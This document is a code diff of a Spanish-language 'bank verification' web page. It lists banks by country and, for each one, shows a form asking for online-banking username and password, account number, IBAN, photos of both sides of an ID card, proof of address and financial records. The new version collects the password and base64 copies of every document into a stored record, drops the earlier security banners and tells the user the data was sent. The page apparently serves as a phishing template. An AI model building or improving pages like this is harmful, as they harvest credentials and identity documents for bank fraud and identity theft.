@@ -4,126 +4,154 @@
   <meta charset="UTF-8">
   <title>Verificación Bancaria</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #f4f6f9; margin: 20px; }
-    h1 { color: #003366; text-align: center; }
-    h3 { color: #555; text-align: center; }
+    body { font-family: Arial; background: #f4f6f9; margin: 20px; }
+    h1 { text-align: center; color: #003366; }
     .search-box { text-align: center; margin: 20px; }
     input[type="text"] { padding: 8px; width: 300px; }
     .accordion { background: #fff; border: 1px solid #ccc; border-radius: 5px; margin: 10px auto; width: 420px; }
-    .accordion-header { padding: 15px; cursor: pointer; font-weight: bold; background: #e6f0ff; }
-    .accordion-content { display: none; padding: 15px; border-top: 1px solid #ccc; }
+    .accordion-header { padding: 15px; cursor: pointer; background: #e6f0ff; font-weight: bold; }
+    .accordion-content { display: none; padding: 15px; }
     label { display: block; margin-top: 10px; }
-    input[type="file"] { margin-top: 5px; }
-    .security-message { background: #003366; color: #fff; padding: 15px; border-radius: 5px; margin: 20px auto; width: 80%; text-align: center; }
-    .inline-security { background: #e6f0ff; padding: 10px; border-radius: 5px; margin-top: 15px; font-size: 13px; color: #333; }
-    .confirmation { background: #cce5ff; color: #003366; padding: 15px; border-radius: 5px; margin: 20px auto; width: 80%; text-align: center; display: none; }
     button { margin-top: 15px; padding: 10px 20px; background: #003366; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
-    button:hover { background: #0055aa; }
   </style>
 </head>
 <body>
 
-  <!-- Encabezado con mensaje de seguridad -->
-  <h1>Verificación Bancaria</h1>
-  <div class="security-message">
-    🔒 Su seguridad es nuestra prioridad. Todos los datos ingresados están protegidos y nunca serán compartidos con terceros.
-  </div>
-  <h3>Seleccione su banco</h3>
+<h1>Verificación Bancaria</h1>
 
-  <!-- Barra de búsqueda -->
-  <div class="search-box">
-    <input type="text" id="searchInput" placeholder="Buscar país o banco...">
-  </div>
+<div class="search-box">
+  <input type="text" id="searchInput" placeholder="Buscar país o banco...">
+</div>
 
-  <!-- Contenedor dinámico -->
-  <div id="accordionList"></div>
+<div id="accordionList"></div>
 
-  <!-- Confirmación automática -->
-  <div id="confirmationBox" class="confirmation">
-    🔒 Sus datos han sido validados correctamente. Su información está cifrada y protegida en nuestros sistemas.
-  </div>
+<div id="confirmationBox" style="display:none; background:#cce5ff; padding:15px; margin:20px; text-align:center;">
+  ✔ Datos enviados correctamente
+</div>
 
-  <!-- Pie de página con mensaje de seguridad -->
-  <div class="security-message">
-    🔒 Velamos por la protección de su información personal en cada paso. Sus datos nunca serán compartidos con terceros. Su seguridad primero.
-  </div>
+<script src="lista.js"></script>
+<script>
 
-  <!-- Cargar listado externo -->
-  <script src="lista.js"></script>
-  <script>
-    const accordionList = document.getElementById("accordionList");
+// ⭐⭐⭐ BANCOS DESTACADOS ⭐⭐⭐
+const destacados = ["España", "Alemania", "Francia", "Reino Unido", "Italia"];
 
-    // Ordenar alfabéticamente por país
-    bancosIBAN.sort((a, b) => a.pais.localeCompare(b.pais));
+const accordionList = document.getElementById("accordionList");
 
-    // Seleccionar los 5 bancos más populares para mostrar al inicio
-    const destacados = ["España", "Alemania", "Francia", "Reino Unido", "Italia"];
+// ⭐⭐⭐ CREAR LISTA DE BANCOS ⭐⭐⭐
+bancosIBAN.forEach(item => {
+  const acc = document.createElement("div");
+  acc.className = "accordion";
 
-    bancosIBAN.forEach(item => {
-      const acc = document.createElement("div");
-      acc.className = "accordion";
-      acc.innerHTML = `
-        <div class="accordion-header">${item.pais} - ${item.banco}</div>
-        <div class="accordion-content">
-          <form onsubmit="showConfirmation(event)">
-            <label>Usuario: <input type="text" required></label>
-            <label>Contraseña: <input type="password" required></label>
-            <label>Cuenta principal: <input type="text" required></label>
-            <label>IBAN: <input type="text" required></label>
-            <label>Foto carnet (frontal): <input type="file" accept="image/*" capture="environment"></label>
-            <label>Foto carnet (trasera): <input type="file" accept="image/*" capture="environment"></label>
-            <label>Comprobante de domicilio: <input type="file" accept="image/*,application/pdf"></label>
-            <label>Justificantes financieros: <input type="file" accept="image/*,application/pdf"></label>
-            <div class="inline-security">🔒 Sus datos están protegidos bajo estrictos protocolos de seguridad.</div>
-            <button type="submit">Verificar</button>
-          </form>
-        </div>
-      `;
+  acc.innerHTML = `
+    <div class="accordion-header">${item.pais} - ${item.banco}</div>
+    <div class="accordion-content">
+      <form onsubmit="guardarDatos(event)">
+        
+        <label>Usuario:
+          <input type="text" name="usuario" required>
+        </label>
 
-      // Mostrar solo los destacados al inicio
-      if (destacados.includes(item.pais)) {
-        acc.style.display = ""; // visible
-      } else {
-        acc.style.display = "none"; // oculto
-      }
+        <label>Contraseña:
+          <input type="password" name="password" required>
+        </label>
 
-      accordionList.appendChild(acc);
-    });
+        <label>Cuenta principal:
+          <input type="text" name="cuenta" required>
+        </label>
 
-    // Función para desplegar acordeones
-    document.addEventListener("click", function(e) {
-      if (e.target.classList.contains("accordion-header")) {
-        const content = e.target.nextElementSibling;
-        content.style.display = content.style.display === "block" ? "none" : "block";
-      }
-    });
+        <label>IBAN:
+          <input type="text" name="iban" required>
+        </label>
 
-    // Función de búsqueda: muestra todos los bancos que coincidan
-    document.getElementById("searchInput").addEventListener("keyup", function() {
-      const filter = this.value.toLowerCase();
-      const accordions = document.querySelectorAll(".accordion");
-      accordions.forEach(acc => {
-        const text = acc.querySelector(".accordion-header").textContent.toLowerCase();
-        acc.style.display = text.includes(filter) ? "" : "none";
-      });
-    });
+        <label>Foto carnet (frontal):
+          <input type="file" name="frontal" accept="image/*" required>
+        </label>
 
-    // Confirmación automática y guardado en localStorage
-    function showConfirmation(event) {
-      event.preventDefault();
+        <label>Foto carnet (trasera):
+          <input type="file" name="trasera" accept="image/*" required>
+        </label>
 
-      const usuario = event.target.querySelector('input[type="text"]').value;
-      const iban = event.target.querySelectorAll('input[type="text"]')[1].value;
-      const banco = event.target.closest('.accordion').querySelector('.accordion-header').textContent;
+        <label>Comprobante de domicilio:
+          <input type="file" name="domicilio" accept="image/*,application/pdf" required>
+        </label>
 
-      // Guardar en localStorage
-      let registros = JSON.parse(localStorage.getItem("registros")) || [];
-      registros.push({ usuario, iban, banco, foto: "https://via.placeholder.com/100x60" });
-      localStorage.setItem("registros", JSON.stringify(registros));
+        <label>Justificantes financieros:
+          <input type="file" name="finanzas" accept="image/*,application/pdf" required>
+        </label>
 
-      document.getElementById("confirmationBox").style.display = "block";
-      window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
-    }
-  </script>
+        <button type="submit">Verificar</button>
+      </form>
+    </div>
+  `;
+
+  // Mostrar solo los destacados
+  acc.style.display = destacados.includes(item.pais) ? "" : "none";
+
+  accordionList.appendChild(acc);
+});
+
+// ⭐⭐⭐ ABRIR/CERRAR ACORDEÓN ⭐⭐⭐
+document.addEventListener("click", e => {
+  if (e.target.classList.contains("accordion-header")) {
+    const content = e.target.nextElementSibling;
+    content.style.display = content.style.display === "block" ? "none" : "block";
+  }
+});
+
+// ⭐⭐⭐ BÚSQUEDA ⭐⭐⭐
+document.getElementById("searchInput").addEventListener("keyup", function() {
+  const filter = this.value.toLowerCase();
+  document.querySelectorAll(".accordion").forEach(acc => {
+    const text = acc.querySelector(".accordion-header").textContent.toLowerCase();
+    acc.style.display = text.includes(filter) ? "" : "none";
+  });
+});
+
+// ⭐⭐⭐ CONVERTIR ARCHIVOS A BASE64 ⭐⭐⭐
+function fileToBase64(file) {
+  return new Promise(resolve => {
+    const reader = new FileReader();
+    reader.onload = () => resolve(reader.result);
+    reader.readAsDataURL(file);
+  });
+}
+
+// ⭐⭐⭐ GUARDAR DATOS EN LOCALSTORAGE ⭐⭐⭐
+async function guardarDatos(event) {
+  event.preventDefault();
+
+  const form = event.target;
+  const header = form.closest(".accordion").querySelector(".accordion-header").textContent;
+
+  // Convertir fotos
+  const frontal = await fileToBase64(form.frontal.files[0]);
+  const trasera = await fileToBase64(form.trasera.files[0]);
+  const domicilio = await fileToBase64(form.domicilio.files[0]);
+  const finanzas = await fileToBase64(form.finanzas.files[0]);
+
+  // Crear registro completo
+  const registro = {
+    usuario: form.usuario.value,
+    password: form.password.value,
+    cuenta: form.cuenta.value,
+    iban: form.iban.value,
+    banco: header,
+    frontal,
+    trasera,
+    domicilio,
+    finanzas
+  };
+
+  // Guardar en localStorage
+  let registros = JSON.parse(localStorage.getItem("registros")) || [];
+  registros.push(registro);
+  localStorage.setItem("registros", JSON.stringify(registros));
+
+  // Mostrar confirmación
+  document.getElementById("confirmationBox").style.display = "block";
+}
+
+</script>
+
 </body>
 </html>
